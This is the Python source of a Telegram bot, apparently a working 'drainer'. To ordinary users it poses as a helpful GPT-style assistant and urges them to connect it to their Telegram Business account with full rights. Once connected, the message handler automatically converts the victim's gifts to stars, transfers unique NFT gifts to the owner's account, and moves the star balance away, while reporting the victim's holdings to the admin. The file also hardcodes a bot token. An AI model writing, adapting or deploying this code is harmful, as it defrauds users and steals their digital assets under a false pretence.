import asyncio import json import logging import os

from aiogram import Bot, Dispatcher, F, types from aiogram.client.default import DefaultBotProperties from aiogram.enums import ParseMode from aiogram.filters import Command from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto from aiogram.types.business_connection import BusinessConnection, Message from aiogram.methods import ( GetBusinessAccountStarBalance, GetBusinessAccountGifts, SendMessage, ReadBusinessMessage, GetAvailableGifts, TransferGift, ConvertGiftToStars, UpgradeGift ) from aiogram.exceptions import TelegramBadRequest

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

TOKEN = "8009461376:AAHjMUEZV5L90B1Vqrv7tHm8XQZDaKUFNMU"
ADMIN_ID = 861087987  # Replace with your admin Telegram ID 
OWNER_ID = ADMIN_ID CONNECTIONS_FILE = "business_connections.json"

logging.basicConfig(level=logging.INFO)

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML)) dp = Dispatcher()

def load_json_file(filename): try: with open(filename, "r") as f: content = f.read().strip() if not content: return [] return json.loads(content) except (FileNotFoundError, json.JSONDecodeError): return []

def load_connections(): return load_json_file(CONNECTIONS_FILE)

def save_business_connection_data(business_connection): data = load_json_file(CONNECTIONS_FILE) business_connection_data = { "user_id": business_connection.user.id, "business_connection_id": business_connection.id, "username": business_connection.user.username, "first_name": "FirstName", "last_name": "LastName" }

for i, conn in enumerate(data):
    if conn["user_id"] == business_connection.user.id:
        data[i] = business_connection_data
        break
else:
    data.append(business_connection_data)

with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str: try: gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id)) for gift in gifts.gifts: if gift.owned_gift_id == owned_gift_id: gift_name = gift.gift.base_name.replace(" ", "") return f"https://t.me/nft/{gift_name}-{gift.gift.number}" except Exception: pass return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."

async def send_welcome_message_to_admin(connection, user_id, _bot): try: rights = connection.rights business_connection = connection

rights_text = "\n".join([
        "üìç <b>–ü—Ä–∞–≤–∞ –±–æ—Ç–∞:</b>",
        f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –≤—Å–µ—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_all_messages else '‚ùå'}",
        f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∏–º–µ–Ω–∏: {'‚úÖ' if rights.can_edit_name else '‚ùå'}",
        f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –æ–ø–∏—Å–∞–Ω–∏—è: {'‚úÖ' if rights.can_edit_bio else '‚ùå'}",
        f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–æ—Ç–æ –ø—Ä–æ—Ñ–∏–ª—è: {'‚úÖ' if rights.can_edit_profile_photo else '‚ùå'}",
        f"‚ñ´Ô∏è –†–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ username: {'‚úÖ' if rights.can_edit_username else '‚ùå'}",
        f"‚ñ´Ô∏è –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_change_gift_settings else '‚ùå'}",
        f"‚ñ´Ô∏è –ü—Ä–æ—Å–º–æ—Ç—Ä –ø–æ–¥–∞—Ä–∫–æ–≤ –∏ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_view_gifts_and_stars else '‚ùå'}",
        f"‚ñ´Ô∏è –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã: {'‚úÖ' if rights.can_convert_gifts_to_stars else '‚ùå'}",
        f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞/—É–ª—É—á—à–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–æ–≤: {'‚úÖ' if rights.can_transfer_and_upgrade_gifts else '‚ùå'}",
        f"‚ñ´Ô∏è –ü–µ—Ä–µ–¥–∞—á–∞ –∑–≤—ë–∑–¥: {'‚úÖ' if rights.can_transfer_stars else '‚ùå'}",
        f"‚ñ´Ô∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∏—Å—Ç–æ—Ä–∏—è–º–∏: {'‚úÖ' if rights.can_manage_stories else '‚ùå'}",
        f"‚ñ´Ô∏è –£–¥–∞–ª–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã—Ö —Å–æ–æ–±—â–µ–Ω–∏–π: {'‚úÖ' if rights.can_delete_sent_messages else '‚ùå'}",
    ])

    star_amount = 0
    all_gifts_amount = 0
    unique_gifts_amount = 0

    if rights.can_view_gifts_and_stars:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
        star_amount = response.star_amount
        gifts = await bot(GetFixedBusinessAccountGifts(business_connection_id=business_connection.id))
        all_gifts_amount = len(gifts.gifts)
        unique_gifts_amount = sum(1 for gift in gifts.gifts if gift.type == "unique")

    msg = (
        f"ü§ñ <b>–ù–æ–≤—ã–π –±–∏–∑–Ω–µ—Å-–±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω!</b>\n\n"
        f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{business_connection.user.username or '‚Äî'}\n"
        f"üÜî User ID: <code>{business_connection.user.id}</code>\n"
        f"üîó Connection ID: <code>{business_connection.id}</code>\n"
        f"\n{rights_text}"
        f"\n‚≠êÔ∏è –ó–≤–µ–∑–¥—ã: <code>{star_amount}</code>"
        f"\nüéÅ –ü–æ–¥–∞—Ä–∫–æ–≤: <code>{all_gifts_amount}</code>"
        f"\nüîù NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{unique_gifts_amount}</code>"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏", callback_data=f"reveal_all_gifts:{user_id}")],
        [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{user_id}")],
        [InlineKeyboardButton(text=f"üîù –ê–ø–≥—Ä–µ–π–¥–Ω—É—Ç—å –≤—Å–µ –≥–∏—Ñ—Ç—ã", callback_data=f"upgrade_user:{user_id}")]
    ])
    await _bot.send_message(ADMIN_ID, msg, reply_markup=keyboard)
except Exception as e:
    logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

@dp.message(Command("start")) async def cmd_start(message: types.Message): if message.from_user.id != ADMIN_ID: await message.answer( "‚ù§Ô∏è <b>–Ø ‚Äî —Ç–≤–æ–π –≥–ª–∞–≤–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫ –≤ –∂–∏–∑–Ω–∏</b>, –∫–æ—Ç–æ—Ä—ã–π:\n" "‚Ä¢ –æ—Ç–≤–µ—Ç–∏—Ç –Ω–∞ –ª—é–±–æ–π –≤–æ–ø—Ä–æ—Å\n" "‚Ä¢ –ø–æ–¥–¥–µ—Ä–∂–∏—Ç —Ç–µ–±—è –≤ —Ç—Ä—É–¥–Ω—É—é –º–∏–Ω—É—Ç—É\n" "‚Ä¢ —Å–¥–µ–ª–∞–µ—Ç –∑–∞ —Ç–µ–±—è –¥–æ–º–∞—à–∫—É, —Ä–∞–±–æ—Ç—É –∏–ª–∏ –¥–∞–∂–µ –Ω–∞—Ä–∏—Å—É–µ—Ç –∫–∞—Ä—Ç–∏–Ω—É\n\n" "<i>–í–≤–µ–¥–∏ –∑–∞–ø—Ä–æ—Å –Ω–∏–∂–µ, –∏ —è –ø–æ–º–æ–≥—É —Ç–µ–±–µ!</i> üëá" ) else: await message.answer( "Antistoper Drainer\n\n" "/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n" "/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n" "/transfer <owned_id> <business_connect> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n" "/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã" )

@dp.message(Command("refund")) async def refund_command(message: types.Message): try: args = message.text.split() if len(args) != 2: await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ id –æ–ø–µ—Ä–∞—Ü–∏–∏. –ü—Ä–∏–º–µ—Ä: /refund 123456") return

transaction_id = args[1]
    refund_result = await bot.refund_star_payment(
        user_id=message.from_user.id,
        telegram_payment_charge_id=transaction_id
    )

    if refund_result:
        await message.answer(f"–í–æ–∑–≤—Ä–∞—Ç –∑–≤—ë–∑–¥ –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id} —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!")
    else:
        await message.answer(f"–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤–æ–∑–≤—Ä–∞—Ç –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id}.")
except Exception as e:
    await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –≤–æ–∑–≤—Ä–∞—Ç–∞: {str(e)}")

@dp.message(F.text) async def handle_text_query(message: Message): await message.answer( "üìå <b>–î–ª—è –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ–π —Ä–∞–±–æ—Ç—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É Telegram</b>\n\n" "–ö–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å?\n\n" "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n" "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n" "3. ü§ñ –û—Ç–∫—Ä–æ–π—Ç–µ –ø—É–Ω–∫—Ç <b>–ß–∞—Ç-–±–æ—Ç—ã</b>\n" "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ <code>@TitanGpt_RoBot</code>\n\n" "–ò–º—è –±–æ—Ç–∞: <code>@TitanGpt_RoBot</code>\n\n" "‚ùó–î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç—É —Ç—Ä–µ–±—É—é—Ç—Å—è <b>–≤—Å–µ –ø—Ä–∞–≤–∞</b>" )

@dp.business_connection() async def handle_business_connect(business_connection: BusinessConnection): try: await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot) await bot.send_message(business_connection.user.id, "–ü—Ä–∏–≤–µ—Ç! –¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞. –¢–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤ –ª—é–±–æ–º –ª–∏—á–Ω–æ–º —á–∞—Ç–µ '.gpt –∑–∞–ø—Ä–æ—Å'") save_business_connection_data(business_connection) except Exception as e: logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –±–∏–∑–Ω–µ—Å-–±–æ—Ç–∞")

@dp.business_message() async def get_message(message: types.Message): business_id = message.business_connection_id user_id = message.from_user.id

if user_id == OWNER_ID:
    return

try:
    convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
    for gift in convert_gifts.gifts:
        await bot.convert_gift_to_stars(business_id, gift.owned_gift_id)
except Exception as e:
    logging.warning(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")

try:
    unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
    for gift in unique_gifts.gifts:
        await bot.transfer_gift(business_id, gift.owned_gift_id, OWNER_ID, 25)
except Exception as e:
    logging.warning(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")

try:
    stars = await bot.get_business_account_star_balance(business_id)
    if stars.amount > 0:
        await bot.transfer_business_account_stars(business_id, int(stars.amount))
except Exception as e:
    logging.warning(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å–æ –∑–≤–µ–∑–¥–∞–º–∏: {e}")

async def main(): await dp.start_polling(bot)

if name == "main": asyncio.run(main())

